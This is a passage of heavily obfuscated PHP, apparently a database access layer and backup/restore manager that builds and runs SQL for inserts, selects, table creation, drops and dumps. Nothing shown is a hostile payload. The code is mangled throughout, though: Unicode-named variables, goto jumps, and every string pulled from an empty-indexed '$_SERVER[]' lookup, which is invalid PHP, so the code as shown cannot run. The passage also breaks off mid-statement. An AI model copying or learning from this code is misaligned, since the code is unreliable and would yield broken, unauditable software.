$this->_getDsnType($eĤ[$bߣ[843]]); } } else { think_exception(think_lang($bߣ[894]) . $bߣ[895] . $f); } goto D; fщ: } public function __call($d, $Eɰ) { if (method_exists($this, $d)) { return call_user_func_array(array($this, $d), $Eɰ); } } protected function _getDsnType($C덊) { $aꎭ = explode($_SERVER[][4], $C덊); $cŒ = strtoupper(trim($aꎭ[0])); return $cŒ; } private function parseConfig($Aѝ = '') { $F􌃢 =& $_SERVER[]; if (!empty($Aѝ) && is_string($Aѝ)) { $Aѝ = $this->parseDSN($Aѝ); } elseif (is_array($Aѝ)) { $Aѝ = array_change_key_case($Aѝ); $Aѝ = array($F􌃢[891] => $Aѝ[$F􌃢[742]], $F􌃢[816] => $Aѝ[$F􌃢[896]], $F􌃢[817] => $Aѝ[$F􌃢[897]], $F􌃢[814] => $Aѝ[$F􌃢[898]], $F􌃢[815] => $Aѝ[$F􌃢[899]], $F􌃢[17] => $Aѝ[$F􌃢[900]], $F􌃢[843] => $Aѝ[$F􌃢[744]], $F􌃢[13] => isset($Aѝ[$F􌃢[901]]) ? $Aѝ[$F􌃢[901]] : array()); } elseif (empty($Aѝ)) { if (think_config($F􌃢[902]) && $F􌃢[743] != strtolower(think_config($F􌃢[903]))) { $Aѝ = $this->parseDSN(think_config($F􌃢[902])); } else { $Aѝ = array($F􌃢[891] => think_config($F􌃢[903]), $F􌃢[816] => think_config($F􌃢[904]), $F􌃢[817] => think_config($F􌃢[905]), $F􌃢[814] => think_config($F􌃢[906]), $F􌃢[815] => think_config($F􌃢[907]), $F􌃢[17] => think_config($F􌃢[234]), $F􌃢[843] => think_config($F􌃢[902]), $F􌃢[13] => think_config($F􌃢[908])); } } return $Aѝ; } protected function initConnect($e = true) { if (1 == think_config($_SERVER[][18])) { $this->_linkID = $this->multiConnect($e); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($Fȕ = false) { $b郟 =& $_SERVER[]; static $f؜ = array(); if (empty($f؜)) { foreach ($this->config as $f => $d) { $f؜[$f] = explode($b郟[47], $d); } } if (think_config($b郟[909])) { if ($Fȕ) { $fɳ = floor(mt_rand(0, think_config($b郟[910]) - 1)); } else { if (is_numeric(think_config($b郟[911]))) { $fɳ = think_config($b郟[911]); } else { $fɳ = floor(mt_rand(think_config($b郟[910]), count($f؜[$b郟[814]]) - 1)); } } } else { $fɳ = floor(mt_rand(0, count($f؜[$b郟[814]]) - 1)); } $D = array($b郟[816] => isset($f؜[$b郟[816]][$fɳ]) ? $f؜[$b郟[816]][$fɳ] : $f؜[$b郟[816]][0], $b郟[817] => isset($f؜[$b郟[817]][$fɳ]) ? $f؜[$b郟[817]][$fɳ] : $f؜[$b郟[817]][0], $b郟[814] => isset($f؜[$b郟[814]][$fɳ]) ? $f؜[$b郟[814]][$fɳ] : $f؜[$b郟[814]][0], $b郟[815] => isset($f؜[$b郟[815]][$fɳ]) ? $f؜[$b郟[815]][$fɳ] : $f؜[$b郟[815]][0], $b郟[17] => isset($f؜[$b郟[17]][$fɳ]) ? $f؜[$b郟[17]][$fɳ] : $f؜[$b郟[17]][0], $b郟[843] => isset($f؜[$b郟[843]][$fɳ]) ? $f؜[$b郟[843]][$fɳ] : $f؜[$b郟[843]][0], $b郟[13] => isset($f؜[$b郟[13]][$fɳ]) ? $f؜[$b郟[13]][$fɳ] : $f؜[$b郟[13]][0]); return $this->connect($D, $fɳ); } public function parseDSN($f׉) { $fÖ =& $_SERVER[]; if (empty($f׉)) { return !1; } $DͰ = parse_url($f׉); if ($DͰ[$fÖ[168]]) { $cԞ = array($fÖ[891] => $DͰ[$fÖ[168]], $fÖ[816] => isset($DͰ[$fÖ[535]]) ? $DͰ[$fÖ[535]] : $fÖ[33], $fÖ[817] => isset($DͰ[$fÖ[912]]) ? $DͰ[$fÖ[912]] : $fÖ[33], $fÖ[814] => isset($DͰ[$fÖ[169]]) ? $DͰ[$fÖ[169]] : $fÖ[33], $fÖ[815] => isset($DͰ[$fÖ[170]]) ? $DͰ[$fÖ[170]] : $fÖ[33], $fÖ[17] => isset($DͰ[$fÖ[75]]) ? substr($DͰ[$fÖ[75]], 1) : $fÖ[33]); } else { preg_match($fÖ[913], trim($f׉), $D); $cԞ = array($fÖ[891] => $D[1], $fÖ[816] => $D[2], $fÖ[817] => $D[3], $fÖ[814] => $D[4], $fÖ[815] => $D[5], $fÖ[17] => $D[6]); } $cԞ[$fÖ[843]] = $fÖ[33]; return $cԞ; } protected function debug() { $B =& $_SERVER[]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $B[914]; if (think_config($B[915])) { think_status($B[916]); think_trace($this->queryStr . $B[917] . think_status($B[20], $B[916], 6) . $B[918], $B[33], $B[919]); } } protected function parseLock($eۇ챏 = false) { $Aьܘ =& $_SERVER[]; if (!$eۇ챏) { return $Aьܘ[33]; } if ($Aьܘ[845] == $this->dbType) { return $Aьܘ[920]; } return $Aьܘ[921]; } protected function parseSet($b) { $aԏ =& $_SERVER[]; foreach ($b as $aφ섌 => $D) { if (is_array($D) && $aԏ[285] == $D[0]) { $eծ[] = $this->parseKey($aφ섌) . $aԏ[922] . $D[1]; } elseif (is_scalar($D) || is_null($D)) { $eծ[] = $this->parseKey($aφ섌) . $aԏ[922] . $this->parseValue($D); } } return $aԏ[923] . implode($aԏ[47], $eծ); } protected function bindParam($a, $d) { $this->bind[$_SERVER[][4] . $a] = $d; } protected function parseBind($Bןꨋ) { $Bןꨋ = array_merge($this->bind, $Bןꨋ); $this->bind = array(); return $Bןꨋ; } function parseKey(&$A䴟, $e̯ = true) { if ($e̯) { $A䴟 = $this->parseKeyCheck($A䴟); } return $A䴟; } function parseKeyCheck($fÏǌ) { $d؏э׃ =& $_SERVER[]; $fÏǌ = trim($fÏǌ); if (!preg_match($d؏э׃[924], $fÏǌ)) { think_exception($d؏э׃[925] . $fÏǌ); } return $fÏǌ; } protected function parseValue($D،) { $d؈ =& $_SERVER[]; if (is_string($D،)) { $D، = $d؈[884] . $this->escapeString($D،) . $d؈[884]; } elseif (isset($D،[0]) && is_string($D،[0]) && strtolower($D،[0]) == $d؈[285]) { $D، = $this->escapeString($D،[1]); } elseif (is_array($D،)) { $D، = array_map(array($this, $d؈[885]), $D،); } elseif (is_bool($D،)) { $D، = $D، ? $d؈[83] : $d؈[468]; } elseif (is_null($D،)) { $D، = $d؈[99]; } return $D،; } protected function parseField($D) { $c =& $_SERVER[]; if (is_string($D) && strpos($D, $c[47])) { $D = explode($c[47], $D); } if (is_array($D)) { $E󠂃 = array(); foreach ($D as $Dפ => $Cר) { if (!is_numeric($Dפ)) { $E󠂃[] = $this->parseKey($Dפ) . $c[926] . $this->parseKey($Cר); } else { $E󠂃[] = $this->parseKey($Cר); } } $cɸ齌 = implode($c[47], $E󠂃); } elseif (is_string($D) && !empty($D)) { $cɸ齌 = $D; } else { $cɸ齌 = $c[176]; } return $cɸ齌; } protected function parseTable($C戃ŭ) { $Dڿ =& $_SERVER[]; if (is_array($C戃ŭ)) { $A̕ = array(); foreach ($C戃ŭ as $fņ => $dĚ) { if (!is_numeric($fņ)) { $A̕[] = $this->parseKey($fņ) . $Dڿ[50] . $this->parseKey($dĚ); } else { $A̕[] = $this->parseKey($fņ); } } $C戃ŭ = $A̕; } elseif (is_string($C戃ŭ)) { if (strstr($C戃ŭ, $Dڿ[50])) { return $C戃ŭ; } $C戃ŭ = explode($Dڿ[47], $C戃ŭ); array_walk($C戃ŭ, array($this, $Dڿ[833])); } return $Dڿ[927] . trim(implode($Dڿ[928], $C戃ŭ), $Dڿ[839]) . $Dڿ[927]; } protected function parseWhere($bſޭ) { $c۝ =& $_SERVER[]; $E醝 = $c۝[33]; if (is_string($bſޭ)) { $E醝 = $bſޭ; } else { $DӚ = isset($bſޭ[$c۝[929]]) ? strtoupper($bſޭ[$c۝[929]]) : $c۝[33]; if (in_array($DӚ, array($c۝[930], $c۝[931], $c۝[932]))) { $DӚ = $c۝[50] . $DӚ . $c۝[50]; unset($bſޭ[$c۝[929]]); } else { $DӚ = $c۝[933]; } foreach ($bſޭ as $d => $Eލ) { $E醝 .= $c۝[265]; if (is_numeric($d)) { $d = $c۝[934]; } if (0 === strpos($d, $c۝[70])) { $E醝 .= $this->parseThinkWhere($d, $Eލ); } else { if (!preg_match($c۝[935], trim($d))) { think_exception(think_lang($c۝[936]) . $c۝[4] . $d); } $C좜 = is_array($Eލ) && isset($Eލ[$c۝[937]]); $d = trim($d); if (strpos($d, $c۝[271])) { $bႮ = explode($c۝[271], $d); $dӏ = array(); foreach ($bႮ as $Bﵐ => $e͌ϫ) { $cҳ۬ = $C좜 ? $Eލ[$Bﵐ] : $Eލ; $dӏ[] = $c۝[248] . $this->parseWhereItem($this->parseKey($e͌ϫ), $cҳ۬) . $c۝[832]; } $E醝 .= implode($c۝[938], $dӏ); } elseif (strpos($d, $c۝[272])) { $bႮ = explode($c۝[272], $d); $dӏ = array(); foreach ($bႮ as $Bﵐ => $e͌ϫ) { $cҳ۬ = $C좜 ? $Eލ[$Bﵐ] : $Eލ; $dӏ[] = $c۝[248] . $this->parseWhereItem($this->parseKey($e͌ϫ), $cҳ۬) . $c۝[832]; } $E醝 .= implode($c۝[933], $dӏ); } else { $E醝 .= $this->parseWhereItem($this->parseKey($d), $Eލ); } } $E醝 .= $c۝[266] . $DӚ; } $E醝 = substr($E醝, 0, -strlen($DӚ)); } return empty($E醝) ? $c۝[33] : $c۝[939] . $E醝; } protected function parseWhereItem($cԛ, $cݸ҄) { $Cൢ =& $_SERVER[]; $Eȋ״ = $Cൢ[33]; if (is_array($cݸ҄)) { if (is_string($cݸ҄[0])) { $D蘽 = strtolower($cݸ҄[0]); if (in_array($cݸ҄[0], array($Cൢ[922], $Cൢ[940], $Cൢ[941], $Cൢ[942], $Cൢ[943], $Cൢ[944]))) { $Eȋ״ .= $cԛ . $Cൢ[50] . $cݸ҄[0] . $Cൢ[50] . $this->parseValue($cݸ҄[1]); } elseif (preg_match($Cൢ[945], $cݸ҄[0])) { $Eȋ״ .= $cԛ . $Cൢ[50] . $this->exp[$D蘽] . $Cൢ[50] . $this->parseValue($cݸ҄[1]); } elseif (preg_match($Cൢ[946], $cݸ҄[0])) { if (is_array($cݸ҄[1])) { $A = isset($cݸ҄[2]) ? strtoupper($cݸ҄[2]) : $Cൢ[931]; if (in_array($A, array($Cൢ[930], $Cൢ[931], $Cൢ[932]))) { $B = array(); foreach ($cݸ҄[1] as $cщ) { $B[] = $cԛ . $Cൢ[50] . $this->exp[$D蘽] . $Cൢ[50] . $this->parseValue($cщ); } $Eȋ״ .= $Cൢ[248] . implode($Cൢ[50] . $A . $Cൢ[50], $B) . $Cൢ[832]; } } else { $Eȋ״ .= $cԛ . $Cൢ[50] . $this->exp[$D蘽] . $Cൢ[50] . $this->parseValue($cݸ҄[1]); } } elseif ($Cൢ[285] == $D蘽) { $Eȋ״ .= $Cൢ[830] . $cԛ . $Cൢ[50] . $cݸ҄[1] . $Cൢ[947]; } elseif (preg_match($Cൢ[948], $cݸ҄[0])) { if (isset($cݸ҄[2]) && $Cൢ[285] == $cݸ҄[2]) { $Eȋ״ .= $cԛ . $Cൢ[50] . $this->exp[$D蘽] . $Cൢ[50] . $cݸ҄[1]; } else { if (is_string($cݸ҄[1])) { $cݸ҄[1] = explode($Cൢ[47], $cݸ҄[1]); } $DИ̎ = implode($Cൢ[47], $this->parseValue($cݸ҄[1])); $Eȋ״ .= $cԛ . $Cൢ[50] . $this->exp[$D蘽] . $Cൢ[830] . $DИ̎ . $Cൢ[832]; } } elseif (preg_match($Cൢ[949], $cݸ҄[0])) { $C = is_string($cݸ҄[1]) ? explode($Cൢ[47], $cݸ҄[1]) : $cݸ҄[1]; $Eȋ״ .= $Cൢ[830] . $cԛ . $Cൢ[50] . $this->exp[$D蘽] . $Cൢ[50] . $this->parseValue($C[0]) . $Cൢ[933] . $this->parseValue($C[1]) . $Cൢ[266]; } else { think_exception(think_lang($Cൢ[936]) . $Cൢ[4] . $cݸ҄[0]); } } else { $F = count($cݸ҄); $a = isset($cݸ҄[$F - 1]) ? strtoupper($cݸ҄[$F - 1]) : $Cൢ[33]; if (in_array($a, array($Cൢ[930], $Cൢ[931], $Cൢ[932]))) { $F = $F - 1; } else { $a = $Cൢ[930]; } for ($F׵ԫ = 0; $F׵ԫ < $F; $F׵ԫ++) { $C = is_array($cݸ҄[$F׵ԫ]) ? $cݸ҄[$F׵ԫ][1] : $cݸ҄[$F׵ԫ]; if ($Cൢ[285] == strtolower($cݸ҄[$F׵ԫ][0])) { $Eȋ״ .= $Cൢ[248] . $cԛ . $Cൢ[50] . $C . $Cൢ[947] . $a . $Cൢ[50]; } else { $Cﶅ = is_array($cݸ҄[$F׵ԫ]) ? $this->exp[strtolower($cݸ҄[$F׵ԫ][0])] : $Cൢ[922]; if (!$Cﶅ && is_array($cݸ҄[$F׵ԫ]) && in_array($cݸ҄[$F׵ԫ][0], array($Cൢ[922], $Cൢ[940], $Cൢ[941], $Cൢ[942], $Cൢ[943], $Cൢ[944]))) { $Cﶅ = $cݸ҄[$F׵ԫ][0]; } $Eȋ״ .= $Cൢ[248] . $cԛ . $Cൢ[50] . $Cﶅ . $Cൢ[50] . $this->parseValue($C) . $Cൢ[947] . $a . $Cൢ[50]; } } $Eȋ״ = substr($Eȋ״, 0, -4); } } else { $Eȋ״ .= $cԛ . $Cൢ[950] . $this->parseValue($cݸ҄); } return $Eȋ״; } protected function parseThinkWhere($FƷ, $bύ) { $Eэ =& $_SERVER[]; $fך = $Eэ[33]; switch ($FƷ) { case $Eэ[339]: $fך = $bύ; break; case $Eэ[934]: $fך = is_string($bύ) ? $bύ : substr($this->parseWhere($bύ), 6); break; case $Eэ[951]: parse_str($bύ, $Aϙ۠); if (isset($Aϙ۠[$Eэ[929]])) { $BԹ = $Eэ[50] . strtoupper($Aϙ۠[$Eэ[929]]) . $Eэ[50]; unset($Aϙ۠[$Eэ[929]]); } else { $BԹ = $Eэ[933]; } $c = array(); foreach ($Aϙ۠ as $BΈÉ => $B̊ɟ) { $c[] = $this->parseKey($BΈÉ) . $Eэ[950] . $this->parseValue($B̊ɟ); } $fך = implode($BԹ, $c); break; } return $fך; } protected function parseLimit($aԐ) { $c =& $_SERVER[]; return !empty($aԐ) ? $c[48] . $aԐ . $c[50] : $c[33]; } protected function parseJoin($cߎ) { $F =& $_SERVER[]; $D = $F[33]; if (!empty($cߎ)) { if (is_array($cߎ)) { foreach ($cߎ as $A΃ǣ => $C˭) { if (!1 !== stripos($C˭, $F[952])) { $D .= $F[50] . $C˭; } else { $D .= $F[953] . $C˭; } } } else { $D .= $F[953] . $cߎ; } } $D = preg_replace($F[954], think_config($F[857]) . $F[955], $D); return $D; } protected function parseOrder($cċ) { $F񕬙 =& $_SERVER[]; if (is_array($cċ)) { $b綬 = array(); foreach ($cċ as $b備 => $fՅ) { if (is_numeric($b備)) { $b綬[] = $this->parseKey($fՅ); } else { $fՅ = in_array(strtoupper(trim($fՅ)), array($F񕬙[956], $F񕬙[957])) ? $F񕬙[50] . $fՅ : $F񕬙[33]; if (preg_match($F񕬙[958], $b備)) { $b綬[] = $this->parseKey($b備) . $fՅ; } else { think_exception($F񕬙[959] . $b備); } } } $cċ = implode($F񕬙[47], $b綬); } return !empty($cċ) ? $F񕬙[960] . $cċ : $F񕬙[33]; } protected function parseGroup($C؞þ) { $f =& $_SERVER[]; return !empty($C؞þ) ? $f[961] . $C؞þ : $f[33]; } protected function parseHaving($Fƞ҄) { $e =& $_SERVER[]; return !empty($Fƞ҄) ? $e[962] . $Fƞ҄ : $e[33]; } protected function parseComment($CӠ͡) { $C =& $_SERVER[]; return !empty($CӠ͡) ? $C[963] . $CӠ͡ . $C[964] : $C[33]; } protected function parseDistinct($F) { $A =& $_SERVER[]; return !empty($F) ? $A[965] : $A[33]; } protected function parseUnion($b) { $Bꐴ =& $_SERVER[]; if (empty($b)) { return $Bꐴ[33]; } if (isset($b[$Bꐴ[336]])) { $DЫώ = $Bꐴ[966]; unset($b[$Bꐴ[336]]); } else { $DЫώ = $Bꐴ[967]; } foreach ($b as $ḟ) { $aݟل[] = $DЫώ . (is_array($ḟ) ? $this->buildSelectSql($ḟ) : $ḟ); } return implode($Bꐴ[50], $aݟل); } public function insert($d, $dꐮˍ = array(), $eˎȫ = false) { goto dֆ; dֆ: $F薪ݠ =& $_SERVER[]; $bʝ = $e = array(); $this->model = $dꐮˍ[$F薪ݠ[269]]; goto dѴ; F: $f񊤌 .= $this->parseComment(!empty($dꐮˍ[$F薪ݠ[341]]) ? $dꐮˍ[$F薪ݠ[341]] : $F薪ݠ[33]); return $this->execute($f񊤌, $this->parseBind(!empty($dꐮˍ[$F薪ݠ[273]]) ? $dꐮˍ[$F薪ݠ[273]] : array())); goto A邜; dѴ: foreach ($d as $f墝˱ => $a䮵) { if (is_array($a䮵) && $F薪ݠ[285] == $a䮵[0]) { $e[] = $this->parseKey($f墝˱); $bʝ[] = $a䮵[1]; } elseif (is_scalar($a䮵) || is_null($a䮵)) { $e[] = $this->parseKey($f墝˱); $bʝ[] = $this->parseValue($a䮵); } } $f񊤌 = ($eˎȫ ? $F薪ݠ[834] : $F薪ݠ[835]) . $F薪ݠ[836] . $this->parseTable($dꐮˍ[$F薪ݠ[267]]) . $F薪ݠ[830] . implode($F薪ݠ[47], $e) . $F薪ݠ[831] . implode($F薪ݠ[47], $bʝ) . $F薪ݠ[832]; $f񊤌 .= $this->parseLock(isset($dꐮˍ[$F薪ݠ[791]]) ? $dꐮˍ[$F薪ݠ[791]] : !1); goto F; A邜: } public function selectInsert($Cܕ翻, $eۉ, $Cđ = array()) { goto BҒ; E: array_walk($Cܕ翻, array($this, $F[833])); $a = $F[968] . $this->parseTable($eۉ) . $F[830] . implode($F[47], $Cܕ翻) . $F[947]; $a .= $this->buildSelectSql($Cđ); goto D; D: return $this->execute($a, $this->parseBind(!empty($Cđ[$F[273]]) ? $Cđ[$F[273]] : array())); goto F˘; BҒ: $F =& $_SERVER[]; $this->model = $Cđ[$F[269]]; if (is_string($Cܕ翻)) { $Cܕ翻 = explode($F[47], $Cܕ翻); } goto E; F˘: } public function update($CӐ, $b݅) { $aә =& $_SERVER[]; $this->model = $b݅[$aә[269]]; $a = $aә[969] . $this->parseTable($b݅[$aә[267]]) . $this->parseSet($CӐ) . $this->parseWhere(!empty($b݅[$aә[263]]) ? $b݅[$aә[263]] : $aә[33]) . $this->parseOrder(!empty($b݅[$aә[350]]) ? $b݅[$aә[350]] : $aә[33]) . $this->parseLimit(!empty($b݅[$aә[280]]) ? $b݅[$aә[280]] : $aә[33]) . $this->parseLock(isset($b݅[$aә[791]]) ? $b݅[$aә[791]] : !1) . $this->parseComment(!empty($b݅[$aә[341]]) ? $b݅[$aә[341]] : $aә[33]); return $this->execute($a, $this->parseBind(!empty($b݅[$aә[273]]) ? $b݅[$aә[273]] : array())); } public function delete($d﫬͢ = array()) { $fА =& $_SERVER[]; $this->model = $d﫬͢[$fА[269]]; $B䵻 = $fА[970] . $this->parseTable($d﫬͢[$fА[267]]) . $this->parseWhere(!empty($d﫬͢[$fА[263]]) ? $d﫬͢[$fА[263]] : $fА[33]) . $this->parseOrder(!empty($d﫬͢[$fА[350]]) ? $d﫬͢[$fА[350]] : $fА[33]) . $this->parseLimit(!empty($d﫬͢[$fА[280]]) ? $d﫬͢[$fА[280]] : $fА[33]) . $this->parseLock(isset($d﫬͢[$fА[791]]) ? $d﫬͢[$fА[791]] : !1) . $this->parseComment(!empty($d﫬͢[$fА[341]]) ? $d﫬͢[$fА[341]] : $fА[33]); return $this->execute($B䵻, $this->parseBind(!empty($d﫬͢[$fА[273]]) ? $d﫬͢[$fА[273]] : array())); } public function select($bԉ = array()) { goto Cᾂ; b慼: if ($c뻋 && !1 !== $aԱ) { think_cache($f, $aԱ, $c뻋); } return $aԱ; goto Bņʗޛ; Cܢ: $c뻋 = isset($bԉ[$CÃܧ[337]]) ? $bԉ[$CÃܧ[337]] : !1; if ($c뻋) { $f = is_string($c뻋[$CÃܧ[89]]) ? $c뻋[$CÃܧ[89]] : $CÃܧ[971] . md5($Eɉ); $Dӣǯ = think_cache($f, $CÃܧ[33], $c뻋); if (!1 !== $Dӣǯ) { return $Dӣǯ; } } $aԱ = $this->query($Eɉ, $this->parseBind(!empty($bԉ[$CÃܧ[273]]) ? $bԉ[$CÃܧ[273]] : array())); goto b慼; Cᾂ: $CÃܧ =& $_SERVER[]; $this->model = $bԉ[$CÃܧ[269]]; $Eɉ = $this->buildSelectSql($bԉ); goto Cܢ; Bņʗޛ: } public function buildSelectSql($a = array()) { goto Fզᩬ; cЉ: $f̅ = $this->parseSql($this->selectSql, $a); $f̅ .= $this->parseLock(isset($a[$Eχϖ[791]]) ? $a[$Eχϖ[791]] : !1); if (isset($B)) { think_cache($B, $f̅); } goto b􊃱; b􊃱: return $f̅; goto a; Fզᩬ: $Eχϖ =& $_SERVER[]; if (isset($a[$Eχϖ[340]])) { if (strpos($a[$Eχϖ[340]], $Eχϖ[47])) { list($eп, $C) = explode($Eχϖ[47], $a[$Eχϖ[340]]); } else { $eп = $a[$Eχϖ[340]]; } $eп = $eп ? $eп : 1; $C = isset($C) ? $C : (is_numeric($a[$Eχϖ[280]]) ? $a[$Eχϖ[280]] : 20); $d = $C * ((int) $eп - 1); $a[$Eχϖ[280]] = $d . $Eχϖ[47] . $C; } if (think_config($Eχϖ[972])) { $B = $Eχϖ[973] . md5(serialize($a)); $FȽ = think_cache($B); if ($FȽ) { return $FȽ; } } goto cЉ; a: } public function parseSql($Bכ, $aɤ = array()) { $aϚɒ =& $_SERVER[]; $Bכ = str_replace(array($aϚɒ[974], $aϚɒ[975], $aϚɒ[976], $aϚɒ[977], $aϚɒ[978], $aϚɒ[979], $aϚɒ[980], $aϚɒ[981], $aϚɒ[982], $aϚɒ[983], $aϚɒ[984]), array($this->parseTable("{$aɤ[$aϚɒ[267]]}"), $this->parseDistinct(isset($aɤ[$aϚɒ[985]]) ? $aɤ[$aϚɒ[985]] : !1), $this->parseField(!empty($aɤ[$aϚɒ[261]]) ? $aɤ[$aϚɒ[261]] : $aϚɒ[176]), $this->parseJoin(!empty($aɤ[$aϚɒ[270]]) ? $aɤ[$aϚɒ[270]] : $aϚɒ[33]), $this->parseWhere(!empty($aɤ[$aϚɒ[263]]) ? $aɤ[$aϚɒ[263]] : $aϚɒ[33]), $this->parseGroup(!empty($aɤ[$aϚɒ[986]]) ? $aɤ[$aϚɒ[986]] : $aϚɒ[33]), $this->parseHaving(!empty($aɤ[$aϚɒ[987]]) ? $aɤ[$aϚɒ[987]] : $aϚɒ[33]), $this->parseOrder(!empty($aɤ[$aϚɒ[350]]) ? $aɤ[$aϚɒ[350]] : $aϚɒ[33]), $this->parseLimit(!empty($aɤ[$aϚɒ[280]]) ? $aɤ[$aϚɒ[280]] : $aϚɒ[33]), $this->parseUnion(!empty($aɤ[$aϚɒ[335]]) ? $aɤ[$aϚɒ[335]] : $aϚɒ[33]), $this->parseComment(!empty($aɤ[$aϚɒ[341]]) ? $aɤ[$aϚɒ[341]] : $aϚɒ[33])), $Bכ); return $Bכ; } public function getLastSql($cӠ = '') { return $cӠ ? $this->modelSql[$cӠ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($f) { return addslashes($f); } public function setModel($EƖ) { $this->model = $EƖ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($a݇, $DÇ = '') { $this->database = $a݇; $this->type = $DÇ; } public function model($D㬤 = '') { return new ModelBase($D㬤, $_SERVER[][33], $this->database); } public function db($D = false) { goto EȔ; e윷: $eͥ = $aض[$Eڣ[900]]; $aض[$Eڣ[900]] = $Eڣ[33]; if ($aض[$Eڣ[742]] == $Eڣ[743]) { $D = $aض[$Eڣ[744]]; $aض[$Eڣ[744]] = substr($D, 0, strrpos($D, $Eڣ[988])); } goto eچ; EȔ: $Eڣ =& $_SERVER[]; $aض = array_change_key_case($this->database); if ($this->type == $Eڣ[9] || !$D) { return $this->model()->db(); } goto e윷; c: $this->database = $aض; $BϽԤ->execute("\165\x73\145\x20\140{$eͥ}\140"); return $BϽԤ; goto F䐤; Dڻ: if (!$Aٛ) { $BϽԤ->execute("\143\x72\x65\141\x74\145\40\144\141\164\141\x62\x61\163\x65\x20\140{$eͥ}\x60"); } $aض[$Eڣ[900]] = $eͥ; if ($aض[$Eڣ[742]] == $Eڣ[743]) { $aض[$Eڣ[744]] .= $Eڣ[988] . $eͥ; } goto c; eچ: $this->database = $aض; $BϽԤ = $this->model()->db(); try { $Aٛ = $BϽԤ->execute("\x73\150\x6f\x77\x20\x64\141\164\141\142\141\x73\145\x73\40\x6c\151\153\145\40\47{$eͥ}\47"); } catch (Exception $AɆݮ) { } goto Dڻ; F䐤: } public function createTable($cǥ, $Dү = null) { $d =& $_SERVER[]; if (!IO::exist($cǥ)) { show_json(LNG($d[989]), !1); } $F΋ = sqlSplit(IO::getContent($cǥ)); foreach ($F΋ as $A҉ئ) { if ($Dү) { $c = stripos($A҉ئ, $d[990]) === 0; if ($c) { $Dү->task[$d[991]] += 1; } } $this->model()->db()->execute($A҉ئ); if ($Dү && $c) { preg_match($d[992], $A҉ئ, $Bɑ׃); $Dү->task[$d[993]] = $Bɑ׃[1]; $Dү->update(1); } } $this->taskToCache($Dү); } public function insertTable($Cţ, $f = null) { $A =& $_SERVER[]; $fג = $this->model()->db(); $fɱא = $DŌǂ ? array($DŌǂ) : $fג->getTables(); foreach ($Cţ as $B) { $DŌǂ = basename($B, $A[737]); if (!in_array($DŌǂ, $fɱא)) { continue; } if ($f) { $f->task[$A[993]] = $DŌǂ; } if (get_filesize($B) == 0) { continue; } $E = $this->sqlToDb($B, $f); if (!$E) { show_json(LNG($A[994]) . "\133{$DŌǂ}\135", !1); } } $this->taskToCache($f); } public function sqlFromDb($D, $e˗, $d = null, $e˧ = null) { goto fô; f싮: fclose($dܓ); return $bȦݺ; goto E; Bǋ: $CⲏÔ = $dЅ->getPk(); $c = $dЅ->getDbFields(); do { $B = $dЅ->field($c)->order($CⲏÔ . $_SERVER[][996])->selectPage($e̯, $F矢); $Eެ = isset($B[$_SERVER[][351]][$_SERVER[][353]]) ? $B[$_SERVER[][351]][$_SERVER[][353]] : 0; $e = !empty($B[$_SERVER[][354]]) ? $B[$_SERVER[][354]] : array(); if (!($Dƞ = count($e))) { break; } $B늛 = array(); foreach ($e as $f) { if ($D == $_SERVER[][997] && $f[$_SERVER[][29]] == $_SERVER[][998]) { $eу = json_decode($f[$_SERVER[][359]], !0); if ($eу[$_SERVER[][28]] == date($_SERVER[][709]) && !$eу[$_SERVER[][708]]) { continue; } } if ($e˧) { $f[$_SERVER[][75]] = "\173\151\157\72{$e˧}\x7d" . substr($f[$_SERVER[][75]], strlen("\x7b\x69\x6f\x3a{$f[$_SERVER[][763]]}\175")); $f[$_SERVER[][763]] = $e˧; } $B늛[] = $_SERVER[][999] . $this->sqlEncode($f) . $_SERVER[][1000]; } $F핥 = "\111\116\x53\105\122\124\x20\x49\116\124\117\40\x60{$D}\140\x20\50\140" . implode($_SERVER[][1001], $c) . $_SERVER[][1002]; fwrite($dܓ, $F핥 . implode($_SERVER[][1003], $B늛) . $_SERVER[][67] . PHP_EOL); $F矢++; $bȦݺ += $Dƞ; if ($d) { $d->update($Dƞ); } } while ($F矢 <= $Eެ); goto f싮; A⍑: $F矢 = 1; $e̯ = 500; $dܓ = fopen($e˗, $_SERVER[][995]); goto Bǋ; fô: if ($d) { $d->task[$_SERVER[][993]] = $D; } $dЅ = $this->model($D); $bȦݺ = 0; goto A⍑; E: } public function sqlToDb($eχ, $AǸ = null) { goto EŋȬ; DƐ: $AƵ슼 = 500 + 1; while (!feof($c敊)) { if ($AǸ && $E® != 0) { $AǸ->task[$c螪[991]] += 1; } $E®++; $C· = trim(fgets($c敊)); $c .= $c螪[50] . $this->sqlDecode($C·, $this->type); if ($E® == $AƵ슼) { $c = rtrim(trim($c), $c螪[67]); if (!$eҾ->execute($c)) { return !1; } if ($AǸ) { $AǸ->update($E® - 1); } $c = $c螪[33]; $E® = 0; } } fclose($c敊); goto c; EŋȬ: $c螪 =& $_SERVER[]; $eҾ = $this->model()->db(); $c敊 = @fopen($eχ, $c螪[1004]); goto Bܩ; c: if (trim($c)) { $c = rtrim(trim($c), $c螪[67]); if (!$eҾ->execute($c)) { return !1; } if ($AǸ) { $AǸ->update($E® - 1); } } return !0; goto A⃂; Bܩ: if (!$c敊) { return !1; } $E® = 0; $c = $c螪[33]; goto DƐ; A⃂: } public function dropTable($B橅 = null) { $d = $this->model()->db(); $e񸗿 = $B橅 ? array($B橅) : $d->getTables(); if (!$e񸗿) { return; } foreach ($e񸗿 as $B橅) { $d->execute("\144\x72\x6f\x70\x20\164\x61\x62\154\145\40\x69\146\x20\145\x78\151\x73\x74\163\x20\x60{$B橅}\x60"); } } private function taskToCache($Dӿ = null) { $dשȜ =& $_SERVER[]; if (!$Dӿ) { return; } $EՐ = array($dשȜ[993] => $Dӿ->task[$dשȜ[993]], $dשȜ[991] => $Dӿ->task[$dשȜ[991]], $dשȜ[1005] => $Dӿ->task[$dשȜ[1005]]); if ($EՐ[$dשȜ[991]] == $EՐ[$dשȜ[1005]]) { $EՐ[$dשȜ[715]] = 1; } Cache::set($dשȜ[1006] . $Dӿ->task[$dשȜ[367]], $EՐ); $Dӿ->end(); } private function sqlEncode($Cͺ) { $BԻ =& $_SERVER[]; $EϠ = array(); foreach ($Cͺ as $c) { if (is_array($c)) { $c = json_encode_force($c); } $c = addslashes($c); $c = 